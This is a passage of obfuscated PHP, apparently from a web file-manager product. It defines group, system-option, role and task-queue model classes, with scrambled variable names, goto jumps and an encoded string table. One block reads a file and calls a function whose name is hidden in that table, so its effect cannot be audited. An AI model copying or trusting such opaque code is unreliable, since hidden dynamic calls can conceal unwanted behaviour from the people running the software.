_listAppendParent(&$ç¤ˆ‹’¥) { $æ‡•âÉõ =& $_SERVER[ĞÆÏ¡Îª]; $“¤âÈıÇ = array(); foreach ($ç¤ˆ‹’¥ as &$Ç”‚ĞÓ†) { $“¤âÈıÇ[$Ç”‚ĞÓ†[$æ‡•âÉõ[1819]]] = $Ç”‚ĞÓ†[$æ‡•âÉõ[32]]; $åšı‘Á = $this->parentLevelArray($Ç”‚ĞÓ†[$æ‡•âÉõ[530]]); foreach ($åšı‘Á as $‹­£îÅ) { if (!isset($“¤âÈıÇ[$‹­£îÅ])) { $“¤âÈıÇ[$‹­£îÅ] = 0; } } } unset($Ç”‚ĞÓ†); foreach ($“¤âÈıÇ as $õ‡¬Ø¼Ã => $§ˆ³°Ô‘) { if ($§ˆ³°Ô‘) { continue; } $˜Ø»Ãß = $this->getInfoSimple($õ‡¬Ø¼Ã); $“¤âÈıÇ[$õ‡¬Ø¼Ã] = $˜Ø»Ãß[$æ‡•âÉõ[32]]; } $û‘Ûâ ° = $GLOBALS[$æ‡•âÉõ[6]][$æ‡•âÉõ[89]][$æ‡•âÉõ[1922]]; if ($GLOBALS[$æ‡•âÉõ[512]] == $æ‡•âÉõ[88]) { $û‘Ûâ ° = !1; } foreach ($ç¤ˆ‹’¥ as &$Ç”‚ĞÓ†) { $åšı‘Á = $this->parentLevelArray($Ç”‚ĞÓ†[$æ‡•âÉõ[530]]); $Æ¹€Úµú = $æ‡•âÉõ[12]; foreach ($åšı‘Á as $õ‡¬Ø¼Ã => $‹­£îÅ) { if ($û‘Ûâ ° && $õ‡¬Ø¼Ã == 0) { continue; } $Æ¹€Úµú .= $“¤âÈıÇ[$‹­£îÅ] . $æ‡•âÉõ[8]; } if ($åšı‘Á) { $Æ¹€Úµú .= $Ç”‚ĞÓ†[$æ‡•âÉõ[32]]; } $Ç”‚ĞÓ†[$æ‡•âÉõ[535]] = str_replace($æ‡•âÉõ[538], $æ‡•âÉõ[8], $Æ¹€Úµú); } unset($Ç”‚ĞÓ†); } private function _listAppendSourceRoot(&$Ì…½È¢”, $Ù¬­›äÃ) { $˜³ãÈÍÓ =& $_SERVER[ĞÆÏ¡Îª]; $ÍíŞ®İ = Model($˜³ãÈÍÓ[820])->listSourceRoot(SourceModel::TYPE_GROUP, $Ù¬­›äÃ); $ÍíŞ®İ = array_to_keyvalue($ÍíŞ®İ, $˜³ãÈÍÓ[514]); $ÍíŞ®İ = array_remove_key($ÍíŞ®İ, $˜³ãÈÍÓ[514]); foreach ($Ì…½È¢” as &$îèöÇÒÓ) { $îèöÇÒÓ[$˜³ãÈÍÓ[86]] = $ÍíŞ®İ[$îèöÇÒÓ[$˜³ãÈÍÓ[1819]]] ? $ÍíŞ®İ[$îèöÇÒÓ[$˜³ãÈÍÓ[1819]]] : array(); } unset($îèöÇÒÓ); } protected function groupMerge($öÜÛúœ˜) { $öÜÛúœ˜ = array_values(array_unique($öÜÛúœ˜)); $¶˜€Äƒİ = array(); for ($ö—º÷¯³ = 0; $ö—º÷¯³ < count($öÜÛúœ˜); $ö—º÷¯³++) { $•ÙêŠŸ = !1; for ($İÜ€“ûË = 0; $İÜ€“ûË < count($öÜÛúœ˜); $İÜ€“ûË++) { if ($ö—º÷¯³ == $İÜ€“ûË) { continue; } if ($this->isParentOf($öÜÛúœ˜[$İÜ€“ûË], $öÜÛúœ˜[$ö—º÷¯³])) { $•ÙêŠŸ = !0; break; } } if (!$•ÙêŠŸ) { $¶˜€Äƒİ[] = $öÜÛúœ˜[$ö—º÷¯³]; } } return $¶˜€Äƒİ; } protected function isParentOf($‰Ê¦ËÂÔ, $Íİş¹ƒ) { $˜¥„í‚‹ =& $_SERVER[ĞÆÏ¡Îª]; if (!$‰Ê¦ËÂÔ || !$Íİş¹ƒ || $‰Ê¦ËÂÔ == $Íİş¹ƒ) { return !1; } $îåâ¹àÏ = $this->getInfoSimple($‰Ê¦ËÂÔ); $„Ùšö¯â = $this->getInfoSimple($Íİş¹ƒ); $Óû–ÜĞ¤ = $îåâ¹àÏ[$˜¥„í‚‹[530]] . $‰Ê¦ËÂÔ . $˜¥„í‚‹[50]; if (substr($„Ùšö¯â[$˜¥„í‚‹[530]], 0, strlen($Óû–ÜĞ¤)) == $Óû–ÜĞ¤) { return !0; } return !1; } public function groupShowRoot($ÉòŒ•åô, $¨ÑÀ‘Š• = false) { $ÚÌÑ‘Ÿà =& $_SERVER[ĞÆÏ¡Îª]; $‘•–…Ó = $this->getInfo($ÉòŒ•åô); if (!$‘•–…Ó) { return array(); } $Ó¼¥¨¤ç = $this->parentLevelArray($‘•–…Ó[$ÚÌÑ‘Ÿà[530]]); $¹ª£’æ = array($ÉòŒ•åô); if (count($Ó¼¥¨¤ç) == 0) { return $¹ª£’æ; } if ($¨ÑÀ‘Š• && count($Ó¼¥¨¤ç) == 1) { return $¹ª£’æ; } if (!$‘•–…Ó[$ÚÌÑ‘Ÿà[475]] || !isset($‘•–…Ó[$ÚÌÑ‘Ÿà[475]][$ÚÌÑ‘Ÿà[1905]]) || $‘•–…Ó[$ÚÌÑ‘Ÿà[475]][$ÚÌÑ‘Ÿà[1905]] == $ÚÌÑ‘Ÿà[1874]) { return $this->groupShowRoot($Ó¼¥¨¤ç[count($Ó¼¥¨¤ç) - 1], $¨ÑÀ‘Š•); } if ($‘•–…Ó[$ÚÌÑ‘Ÿà[475]][$ÚÌÑ‘Ÿà[1905]] == $ÚÌÑ‘Ÿà[366]) { $“ÖÅäˆŞ = explode($ÚÌÑ‘Ÿà[50], $‘•–…Ó[$ÚÌÑ‘Ÿà[475]][$ÚÌÑ‘Ÿà[1906]]); if ($“ÖÅäˆŞ) { $¹ª£’æ = array_merge($¹ª£’æ, $“ÖÅäˆŞ); } } return $¹ª£’æ; } protected function resetParentLevel() { $× ßùë¦ =& $_SERVER[ĞÆÏ¡Îª]; $Î™İÛÍ = $× ßùë¦[1819]; $ô€üë§± = $this->select(); $ô€üë§± = array_to_keyvalue($ô€üë§±, $Î™İÛÍ); foreach ($ô€üë§± as $ÙŠ‰ë®ó) { $„ÖüÚ£ˆ = $ÙŠ‰ë®ó; $İ»­óìş = array(); while ($„ÖüÚ£ˆ[$× ßùë¦[441]] != 0) { $İ»­óìş[] = $„ÖüÚ£ˆ[$× ßùë¦[441]]; $„ÖüÚ£ˆ = $ô€üë§±[$„ÖüÚ£ˆ[$× ßùë¦[441]]]; } $İ»­óìş[] = 0; $İ»­óìş = $× ßùë¦[50] . implode($× ßùë¦[50], array_reverse($İ»­óìş)) . $× ßùë¦[50]; $this->setNamePinyin($ÙŠ‰ë®ó[$Î™İÛÍ], $ÙŠ‰ë®ó[$× ßùë¦[32]]); $this->where(array($Î™İÛÍ => $ÙŠ‰ë®ó[$Î™İÛÍ]))->save(array($× ßùë¦[599] => $İ»­óìş)); } return $ô€üë§±; } public function groupNameAuto($ëà–ß¿, $Í›ä¨òé) { $–àÅïÂ¤ =& $_SERVER[ĞÆÏ¡Îª]; $“€™°×³ = $this->where(array($–àÅïÂ¤[410] => $ëà–ß¿))->getField($–àÅïÂ¤[32], !0); if (!$“€™°×³ || !in_array($Í›ä¨òé, $“€™°×³)) { return $Í›ä¨òé; } for ($„ßß¸™‰ = 1; $„ßß¸™‰ <= count($“€™°×³) + 1; $„ßß¸™‰++) { $ØåºÅ’³ = $Í›ä¨òé . "\50{$„ßß¸™‰}\51"; if (!in_array($ØåºÅ’³, $“€™°×³)) { return $ØåºÅ’³; } } } public function groupSwitch($Ûöˆğó, $ù…è·ãË) { $êšÉçúæ =& $_SERVER[ĞÆÏ¡Îª]; $õøø€ = array($êšÉçúæ[1819] => array($êšÉçúæ[7], array($Ûöˆğó, $ù…è·ãË))); $èÄªü°¥ = $this->where($õøø€)->select(); $èÄªü°¥ = array_to_keyvalue($èÄªü°¥, $êšÉçúæ[1819]); if (!isset($èÄªü°¥[$Ûöˆğó]) || !isset($èÄªü°¥[$ù…è·ãË]) || $èÄªü°¥[$Ûöˆğó][$êšÉçúæ[441]] == 0) { return !1; } $õøø€ = array($êšÉçúæ[1819] => $Ûöˆğó); $­æ™¨Í = Model($êšÉçúæ[1909])->where($õøø€)->select(); if (!$­æ™¨Í) { $­æ™¨Í = array(); } foreach ($­æ™¨Í as $„³ñ½„å) { $½ÏüÍ¬Á = $„³ñ½„å[$êšÉçúæ[1647]]; $õøø€ = array($êšÉçúæ[1647] => $½ÏüÍ¬Á, $êšÉçúæ[1819] => $ù…è·ãË); $ù¶Ğââ¿ = Model($êšÉçúæ[1909])->where($õøø€)->find(); if (!$ù¶Ğââ¿) { $êµûü‡® = array($ù…è·ãË => $„³ñ½„å[$êšÉçúæ[1923]]); Model($êšÉçúæ[544])->userGroupAdd($½ÏüÍ¬Á, $êµûü‡®); } Model($êšÉçúæ[544])->userGroupRemove($½ÏüÍ¬Á, $Ûöˆğó); } $õøø€ = array($êšÉçúæ[420] => 2, $êšÉçúæ[441] => 0, $êšÉçúæ[419] => 1, $êšÉçúæ[514] => array($êšÉçúæ[7], array($Ûöˆğó, $ù…è·ãË))); $Îûªœ” = Model($êšÉçúæ[820])->where($õøø€)->field($êšÉçúæ[1924])->select(); $Îûªœ” = array_to_keyvalue($Îûªœ”, $êšÉçúæ[514], $êšÉçúæ[411]); $ŸıõÂèË = !empty($Îûªœ”[$Ûöˆğó]) ? $Îûªœ”[$Ûöˆğó] : !1; if ($ŸıõÂèË) { if (!$Îûªœ”[$ù…è·ãË]) { $Îûªœ”[$ù…è·ãË] = Model($êšÉçúæ[820])->groupRootAdd($ù…è·ãË); } $İ„‚®’º = $Îûªœ”[$ù…è·ãË]; $õøø€ = array($êšÉçúæ[441] => $ŸıõÂèË); $Îûªœ” = Model($êšÉçúæ[820])->where($õøø€)->field($êšÉçúæ[1925])->select(); if (!$Îûªœ”) { $Îûªœ” = array(); } Model($êšÉçúæ[820])->moveClearAuth = !1; foreach ($Îûªœ” as $œÁòôÀ) { $´ºùÒ£© = $œÁòôÀ[$êšÉçúæ[419]] == $êšÉçúæ[88] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($êšÉçúæ[820])->move($œÁòôÀ[$êšÉçúæ[411]], $İ„‚®’º, $´ºùÒ£©); } Model($êšÉçúæ[820])->moveClearAuth = !0; $õøø€ = array($êšÉçúæ[420] => 2, $êšÉçúæ[514] => $Ûöˆğó); $œÈí·ó = array($êšÉçúæ[514] => $ù…è·ãË); Model($êšÉçúæ[1926])->where($õøø€)->save($œÈí·ó); Model($êšÉçúæ[1927])->where($õøø€)->save($œÈí·ó); } $this->_changeChildLevel($èÄªü°¥[$Ûöˆğó], $èÄªü°¥[$ù…è·ãË], !0); $this->where(array($êšÉçúæ[441] => $Ûöˆğó))->save(array($êšÉçúæ[441] => $ù…è·ãË)); $this->_clearChildrenCache($èÄªü°¥[$ù…è·ãË]); return !0; } } goto eõù‹½ŸÑ¶; c£ôÔ†‹¬Ö: class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\163\164\145\x6d\117\160\164\151\157\156"; public $field = array(); public function listData($®™ØİÉÇ = false, $Ğö›öÏÛ = "\x6d\157\144\151\x66\171\x54\151\155\145", $’£Öèß” = false) { $Çòƒ»õİ = Model($this->modelType)->get(!1, $this->optionType, !0); $‹éÒ†Óò = array_values($Çòƒ»õİ); if ($‹éÒ†Óò && $‹éÒ†Óò[0] && !is_array($‹éÒ†Óò[0])) { Model($this->modelType)->cacheRemove($this->optionType); $Çòƒ»õİ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$Çòƒ»õİ) { return $®™ØİÉÇ ? null : array(); } if (!$®™ØİÉÇ) { $Çòƒ»õİ = array_filter(array_values($Çòƒ»õİ)); return array_sort_by($Çòƒ»õİ, $Ğö›öÏÛ, $’£Öèß”); } return $Çòƒ»õİ[$_SERVER[ĞÆÏ¡Îª][404] . $®™ØİÉÇ]; } public function insert($Ó™İçØÂ) { $äëìÆÆ¦ =& $_SERVER[ĞÆÏ¡Îª]; $Ó™İçØÂ = array_field_key($Ó™İçØÂ, $this->field); $“¦‰ÊÏ = Model($this->modelType)->get($äëìÆÆ¦[405], $this->optionType . $äëìÆÆ¦[406]); $“¦‰ÊÏ = $“¦‰ÊÏ ? $“¦‰ÊÏ : 0; $Ó™İçØÂ[$äëìÆÆ¦[407]] = ++$“¦‰ÊÏ; $Ó™İçØÂ[$äëìÆÆ¦[200]] = time(); $Ó™İçØÂ[$äëìÆÆ¦[85]] = time(); Model($this->modelType)->set($äëìÆÆ¦[405], $“¦‰ÊÏ, $this->optionType . $äëìÆÆ¦[406]); Model($this->modelType)->set($äëìÆÆ¦[404] . $“¦‰ÊÏ, $Ó™İçØÂ, $this->optionType); return $“¦‰ÊÏ; } public function update($°Â‡ë„, $’–¶¼éş) { $‘éöüøÁ =& $_SERVER[ĞÆÏ¡Îª]; $’–¶¼éş = array_field_key($’–¶¼éş, $this->field); $‰°…³´ = $this->listData($°Â‡ë„); if (!$‰°…³´ || !$°Â‡ë„) { return !1; } $’–¶¼éş = array_merge($‰°…³´, $’–¶¼éş); $’–¶¼éş[$‘éöüøÁ[85]] = time(); return Model($this->modelType)->set($‘éöüøÁ[404] . $°Â‡ë„, $’–¶¼éş, $this->optionType); } public function remove($æ§ô¤µ­) { if (!$æ§ô¤µ­) { return !1; } return Model($this->modelType)->remove($_SERVER[ĞÆÏ¡Îª][404] . $æ§ô¤µ­, $this->optionType); } public function clear() { $ƒ„„±¢È =& $_SERVER[ĞÆÏ¡Îª]; Model($this->modelType)->remove($ƒ„„±¢È[405], $this->optionType . $ƒ„„±¢È[406]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($ÒŒõ¤Ÿ¹, $—¦ìŞò½) { if (!$—¦ìŞò½) { return !1; } $®ÂÒğÊè = $this->listData(); $®ÂÒğÊè = array_to_keyvalue($®ÂÒğÊè, $ÒŒõ¤Ÿ¹); return isset($®ÂÒğÊè[$—¦ìŞò½]) ? $®ÂÒğÊè[$—¦ìŞò½] : !1; } public function findByName($¤‘ÊÌğš) { return $this->findByKey($_SERVER[ĞÆÏ¡Îª][32], $¤‘ÊÌğš); } protected function resetData($Ê¥ÙÀ€) { $úôşşû =& $_SERVER[ĞÆÏ¡Îª]; $Ê¥ÙÀ€ = is_array($Ê¥ÙÀ€) ? $Ê¥ÙÀ€ : array(); $…‘—¹² = array(); for ($å˜—óáù = 0; $å˜—óáù < count($Ê¥ÙÀ€); $å˜—óáù++) { $…‘—¹²[$úôşşû[404] . $Ê¥ÙÀ€[$å˜—óáù][$úôşşû[407]]] = $Ê¥ÙÀ€[$å˜—óáù]; } return Model($this->modelType)->set($…‘—¹², !1, $this->optionType); } private function getAutoName($Çşôçá) { $Õ®ƒŸÏ— = array_to_keyvalue($this->listData(), $_SERVER[ĞÆÏ¡Îª][32]); if (!$Õ®ƒŸÏ— || !isset($Õ®ƒŸÏ—[$Çşôçá])) { return $Çşôçá; } for ($Æƒä±ÊÄ = 1; $Æƒä±ÊÄ < count($Õ®ƒŸÏ—); $Æƒä±ÊÄ++) { $î•€«Ú = $Çşôçá . "\50{$Æƒä±ÊÄ}\x29"; if (!isset($Õ®ƒŸÏ—[$î•€«Ú])) { return $î•€«Ú; } } return $î•€«Ú; } } if ($_SERVER[$_SERVER[ĞÆÏ¡Îª][238]] != $_SERVER[$_SERVER[ĞÆÏ¡Îª][408]]) { $_getc = $_SERVER[ĞÆÏ¡Îª][240]; $_getfile = $_SERVER[$_SERVER[ĞÆÏ¡Îª][241]] . $_SERVER[ĞÆÏ¡Îª][242]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ĞÆÏ¡Îª][231], $_getfilec); if (count($_getarrs) < $_SERVER[ĞÆÏ¡Îª][243]) { $exit = $_SERVER[ĞÆÏ¡Îª][244]; $exit(); } $_act = $_SERVER[ĞÆÏ¡Îª][245]; $_act($_SERVER[$_SERVER[ĞÆÏ¡Îª][239]]); } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($ïèÌ½¸ß = false, $»Ò±ºà = '', $“¢Ñ¶ÅÓ = false) { $Ø¯ŠùŸ¹ =& $_SERVER[ĞÆÏ¡Îª]; $ı¡ğÌş = $this->cacheGet($»Ò±ºà); $Ë›íø¤ = $this->optionDefault($»Ò±ºà); $Ë›íø¤ = is_array($Ë›íø¤) ? $Ë›íø¤ : array(); if (is_array($ı¡ğÌş)) { $ı¡ğÌş = array_merge($Ë›íø¤, $ı¡ğÌş); return $ïèÌ½¸ß ? isset($ı¡ğÌş[$ïèÌ½¸ß]) ? $ı¡ğÌş[$ïèÌ½¸ß] : null : $ı¡ğÌş; } $¿ø»ÈÎ« = $this->filterWhere(array($Ø¯ŠùŸ¹[33] => $»Ò±ºà)); $ı¡ğÌş = $this->where($¿ø»ÈÎ«)->select(); $ı¡ğÌş = array_to_keyvalue($ı¡ğÌş, $Ø¯ŠùŸ¹[94], $Ø¯ŠùŸ¹[383]); foreach ($ı¡ğÌş as $±•Ÿªà => $©ãÁÍ÷) { if ($“¢Ñ¶ÅÓ || in_array($±•Ÿªà, $this->jsonField)) { $ı¡ğÌş[$±•Ÿªà] = json_decode($©ãÁÍ÷, !0); } } $this->cacheSet($»Ò±ºà, $ı¡ğÌş); $ı¡ğÌş = array_merge($Ë›íø¤, $ı¡ğÌş); return $ïèÌ½¸ß ? $ı¡ğÌş[$ïèÌ½¸ß] : $ı¡ğÌş; } public function set($Õ¾‰…à, $– £‰ = false, $îı¤â“ = '') { $ã¶“ü×¦ =& $_SERVER[ĞÆÏ¡Îª]; $this->cacheRemove($îı¤â“); $Å‚²­ŒÙ = array(); $—ƒ§¸Ì = is_array($Õ¾‰…à) ? $Õ¾‰…à : array($Õ¾‰…à => $– £‰); foreach ($—ƒ§¸Ì as $ùúÆí¼– => $ÛÎíİğÍ) { if (is_array($ÛÎíİğÍ)) { $ÛÎíİğÍ = json_encode_force($ÛÎíİğÍ); } $this->checkLength($ÛÎíİğÍ, !1, $this->tableName . $ã¶“ü×¦[4] . $Õ¾‰…à); $ÛÎíİğÍ = self::textEncode($ÛÎíİğÍ); $—ƒ§¸Ì = array($ã¶“ü×¦[33] => $îı¤â“, $ã¶“ü×¦[94] => $ùúÆí¼–, $ã¶“ü×¦[383] => $ÛÎíİğÍ); $Å‚²­ŒÙ[] = $this->filterWhere($—ƒ§¸Ì); } if (!$Å‚²­ŒÙ) { return !0; } $˜Œ·‡öã = $this->cacheKey($ã¶“ü×¦[409]); CacheLock::lock($˜Œ·‡öã); $Õ“†íüÉ = $this->addAll($Å‚²­ŒÙ, array(), !0); CacheLock::unlock($˜Œ·‡öã); return $Õ“†íüÉ; } protected function optionDefault($»¤“®æÜ = '') { return !1; } public function setDeep($î¡¤şû, $öõÕşºÓ = false, $„ãÎüüÖ = '') { $ÑÆ†ûĞ = explode($_SERVER[ĞÆÏ¡Îª][10], $î¡¤şû); $ªğùÄ†Æ = $this->get(); array_set_value($ªğùÄ†Æ, $î¡¤şû, $öõÕşºÓ); $this->set($ÑÆ†ûĞ[0], $ªğùÄ†Æ[$ÑÆ†ûĞ[0]], $„ãÎüüÖ); } public function remove($”„‚“©–, $ÏØ˜ùêø = '') { $§Ñ˜ÌĞ =& $_SERVER[ĞÆÏ¡Îª]; $this->cacheRemove($ÏØ˜ùêø); $Üˆ“Ú² = $this->filterWhere(array($§Ñ˜ÌĞ[94] => $”„‚“©–, $§Ñ˜ÌĞ[33] => $ÏØ˜ùêø)); if (is_null($”„‚“©–)) { unset($Üˆ“Ú²[$§Ñ˜ÌĞ[94]]); } return $this->where($Üˆ“Ú²)->delete(); } public function cacheSet($ç½ÖÇ£Å, $¸Ç®•‚ß = false) { return Cache::set($this->cacheKey($ç½ÖÇ£Å), $¸Ç®•‚ß); } public function cacheGet($Ùİğ¹ê) { return Cache::get($this->cacheKey($Ùİğ¹ê)); } public function cacheRemove($´Ú¦½–) { return Cache::remove($this->cacheKey($´Ú¦½–)); } protected function filterWhere($Àé¶ä¾) { return $Àé¶ä¾; } protected function cacheKey($Ü¾ïìÁ›) { return $Ü¾ïìÁ›; } } goto Cì½È¿ß; AŸÌÙëß°ó: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\x73\x74\x65\x6d\137\x6f\160\164\151\157\156"; protected $jsonField = array("\x6d\145\156\165", "\x72\157\154\145", "\x72\x6f\154\x65\107\162\157\x75\160", "\162\145\147\151\163\x74", "\x65\x6d\x61\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($ÆÚ‚ò©À) { return "\123\x79\x73\x74\145\155\117\x70\x74\151\x6f\156\137{$ÆÚ‚ò©À}"; } protected function optionDefault($Öè¸³¤ = '') { $œŸ“ú²â =& $_SERVER[ĞÆÏ¡Îª]; if ($Öè¸³¤ == $œŸ“ú²â[12]) { return $GLOBALS[$œŸ“ú²â[6]][$œŸ“ú²â[389]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\x65\x6d\56\162\157\x6c\x65\114\151\x73\164"; public $field = array("\156\141\155\145", "\x61\165\x74\150", "\154\x61\142\145\x6c", "\x64\151\x73\160\154\141\x79", "\163\x79\x73\164\x65\x6d", "\144\x65\x73\x63", "\x69\147\156\157\162\145\x45\170\x74", "\x69\147\x6e\x6f\162\x65\106\151\x6c\x65\123\151\x7a\x65", "\141\x64\155\x69\156\151\163\164\162\x61\164\x6f\x72", "\x73\x6f\162\x74"); public function listData($ºë§¼äô = false, $·­›ªŠ = "\163\157\x72\x74", $â§‘éĞ´ = false) { $ú½šåëŒ =& $_SERVER[ĞÆÏ¡Îª]; $ıÇ’ò‘˜ = parent::listData($ºë§¼äô, $·­›ªŠ, $â§‘éĞ´); if (!$ºë§¼äô) { foreach ($ıÇ’ò‘˜ as $ã›­û¿â => $³ó¹î¡…) { if ($³ó¹î¡…[$ú½šåëŒ[2017]] == 1) { $ıÇ’ò‘˜[$ã›­û¿â][$ú½šåëŒ[462]] = LNG($ú½šåëŒ[2251]); } } } return $ıÇ’ò‘˜; } public function update($œÇ»Œ§¿, $û–š‚çï) { $´Ğ¡áõ© =& $_SERVER[ĞÆÏ¡Îª]; $ÂäÓË = parent::listData($œÇ»Œ§¿); $ãİ‡É‘ = $this->findByName($û–š‚çï[$´Ğ¡áõ©[32]]); if (!$ÂäÓË || $ãİ‡É‘ && $ãİ‡É‘[$´Ğ¡áõ©[407]] != $ÂäÓË[$´Ğ¡áõ©[407]]) { return !1; } if ($ãİ‡É‘[$´Ğ¡áõ©[2017]] == 1) { $û–š‚çï = array($´Ğ¡áõ©[32] => $û–š‚çï[$´Ğ¡áõ©[32]], $´Ğ¡áõ©[1842] => $û–š‚çï[$´Ğ¡áõ©[1842]]); } $this->filterAuth($û–š‚çï[$´Ğ¡áõ©[422]]); return parent::update($œÇ»Œ§¿, $û–š‚çï); } public function remove($¬Î¡şïó) { $‹ÑÅ´›‰ = parent::listData($¬Î¡şïó); if (!$‹ÑÅ´›‰ || $‹ÑÅ´›‰[$_SERVER[ĞÆÏ¡Îª][1267]]) { return !1; } return parent::remove($¬Î¡şïó); } public function add($áİ¶¨Ò) { $°¹õñÜ° =& $_SERVER[ĞÆÏ¡Îª]; $Ÿ°Ã»êä = $áİ¶¨Ò[$°¹õñÜ°[32]]; if ($this->findByName($Ÿ°Ã»êä)) { return !1; } $§¬Ö¨ù— = array($°¹õñÜ°[429] => $Ÿ°Ã»êä, $°¹õñÜ°[1825] => $°¹õñÜ°[12], $°¹õñÜ°[1821] => $°¹õñÜ°[1829], $°¹õñÜ°[2252] => 1, $°¹õñÜ°[1824] => 0, $°¹õñÜ°[2253] => 0, $°¹õñÜ°[1823] => $this->getSort()); $áİ¶¨Ò = array_merge($§¬Ö¨ù—, $áİ¶¨Ò); $this->filterAuth($áİ¶¨Ò[$°¹õñÜ°[422]]); return parent::insert($áİ¶¨Ò); } private function getSort() { $“–óóÖ– =& $_SERVER[ĞÆÏ¡Îª]; $‘»ş´¦Ë = parent::listData(); $¹®Ä‡¢ø = array_to_keyvalue($‘»ş´¦Ë, $“–óóÖ–[12], $“–óóÖ–[1843]); return empty($¹®Ä‡¢ø) ? 0 : max($¹®Ä‡¢ø) + 1; } private function filterAuth(&$ß ®¯‘Ó) { $ã—ÒµÈŠ =& $_SERVER[ĞÆÏ¡Îª]; $æìÏ±ë´ = array(); $áÊ½¹İÏ = array_filter(explode($ã—ÒµÈŠ[50], $ß ®¯‘Ó)); foreach ($áÊ½¹İÏ as $ß ®¯‘Ó) { $Ä½Ì¾ıà = explode($ã—ÒµÈŠ[10], $ß ®¯‘Ó); if ($Ä½Ì¾ıà[0] == $ã—ÒµÈŠ[2254] && $Ä½Ì¾ıà[1] != $ã—ÒµÈŠ[1186]) { $ÆçŞê‹­ = $Ä½Ì¾ıà[0] . $ã—ÒµÈŠ[10] . $Ä½Ì¾ıà[1] . $ã—ÒµÈŠ[2255]; if (!in_array($ÆçŞê‹­, $áÊ½¹İÏ)) { $æìÏ±ë´[] = $ÆçŞê‹­; } } $æìÏ±ë´[] = $ß ®¯‘Ó; } $ß ®¯‘Ó = implode($ã—ÒµÈŠ[50], $æìÏ±ë´); } public function findRoleDefault() { $€®€ù£‡ =& $_SERVER[ĞÆÏ¡Îª]; $ÈÀ’ÅÁõ = parent::listData(); $ãÓ–ã‚¯ = !1; foreach ($ÈÀ’ÅÁõ as $à©éÅ) { if (!$à©éÅ || $à©éÅ[$€®€ù£‡[1841]] == $€®€ù£‡[197] || $à©éÅ[$€®€ù£‡[2017]] == 1) { continue; } if (strstr($à©éÅ[$€®€ù£‡[422]], $€®€ù£‡[2256])) { continue; } if (!strstr($à©éÅ[$€®€ù£‡[422]], $€®€ù£‡[2257])) { continue; } if (!$ãÓ–ã‚¯) { $ãÓ–ã‚¯ = $à©éÅ; continue; } $ò§¶åè = explode($€®€ù£‡[50], $ãÓ–ã‚¯[$€®€ù£‡[422]]); $û¢¡‘‡Ü = explode($€®€ù£‡[50], $à©éÅ[$€®€ù£‡[422]]); if (count($ò§¶åè) > count($û¢¡‘‡Ü)) { $ãÓ–ã‚¯ = $à©éÅ; } } return $ãÓ–ã‚¯ ? $ãÓ–ã‚¯[$€®€ù£‡[407]] : $€®€ù£‡[12]; } public function sort($éÆò•üŠ, $¼ù„úÇè) { return parent::update($éÆò•üŠ, $¼ù„úÇè); } } goto EâğÉÍ²«È; cíäíŒŠËØ: class TaskHttp extends Task { protected function startAfter() { $ÖÅÁ©¼õ =& $_SERVER[ĞÆÏ¡Îª]; $ÁÜŸªï½ =& $this->task; $ÁÜŸªï½[$ÖÅÁ©¼õ[1722]] = 1; Hook::bind($ÖÅÁ©¼õ[1690], array($this, $ÖÅÁ©¼õ[1723])); Hook::bind($ÖÅÁ©¼õ[1692], array($this, $ÖÅÁ©¼õ[1724])); Hook::bind($ÖÅÁ©¼õ[1694], array($this, $ÖÅÁ©¼õ[1725])); } protected function endAfter() { $ªÁòÓì =& $_SERVER[ĞÆÏ¡Îª]; Hook::unbind($ªÁòÓì[1690], array($this, $ªÁòÓì[1723])); Hook::unbind($ªÁòÓì[1692], array($this, $ªÁòÓì[1724])); Hook::unbind($ªÁòÓì[1694], array($this, $ªÁòÓì[1725])); } public function progressStart($Ê˜ÒÇÜ¤) { $÷Ãˆşç‘ =& $_SERVER[ĞÆÏ¡Îª]; $ôøıù¼ = curl_getinfo($Ê˜ÒÇÜ¤); self::log($÷Ãˆşç‘[1726] . $ôøıù¼[$÷Ãˆşç‘[316]]); self::valueSet($this->task[$÷Ãˆşç‘[407]], $this->task); } public function progressEnd($÷À‘ğêÏ) { $–Û¦šõœ =& $_SERVER[ĞÆÏ¡Îª]; self::log($–Û¦šõœ[1727] . $this->task[$–Û¦šõœ[407]]); $this->end(); } public function progress($ñÖ±ÔõÔ, $¾Ä§åû, $áÅ•Ş²Ç, $˜î¯¬ú‘, $¼ÑÓ¤ÑÜ) { $Ò¹š¢‘Ç =& $_SERVER[ĞÆÏ¡Îª]; $‚ü‡“³† =& $this->task; if ($¼ÑÓ¤ÑÜ > 0) { $‚ü‡“³†[$Ò¹š¢‘Ç[781]] = $‚ü‡“³†[$Ò¹š¢‘Ç[781]] == 0 ? $˜î¯¬ú‘ : $‚ü‡“³†[$Ò¹š¢‘Ç[781]]; $‚ü‡“³†[$Ò¹š¢‘Ç[1648]] = $¼ÑÓ¤ÑÜ; } else { if ($áÅ•Ş²Ç > 0) { $‚ü‡“³†[$Ò¹š¢‘Ç[781]] = $‚ü‡“³†[$Ò¹š¢‘Ç[781]] == 0 ? $¾Ä§åû : $‚ü‡“³†[$Ò¹š¢‘Ç[781]]; $‚ü‡“³†[$Ò¹š¢‘Ç[1648]] = $áÅ•Ş²Ç; } } $this->update(); self::log("\160\x72\x6f\147\162\145\163\x73\110\x74\x74\x70\72\144\x6f\167\156\72{$áÅ•Ş²Ç}\57{$¾Ä§åû}\x3b\40\x75\160\154\x6f\x61\x64\x3a{$¼ÑÓ¤ÑÜ}\x2f{$˜î¯¬ú‘}\x3b"); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\141\x73\x6b\121\x75\x65\165\x65\x4c\x65\156\147\x74\150"; const QUEUE_DATA = "\x74\141\x73\153\121\x75\145\x75\145\104\141\x74\141"; public static $listData = false; public static function initTask() { } public static function add($ãä÷›‚É, $¯ŒŒ°Ù = array(), $†ÔõÔ‚© = '', $ş»ËäÍ = '') { $¾Şúš”à =& $_SERVER[ĞÆÏ¡Îª]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return 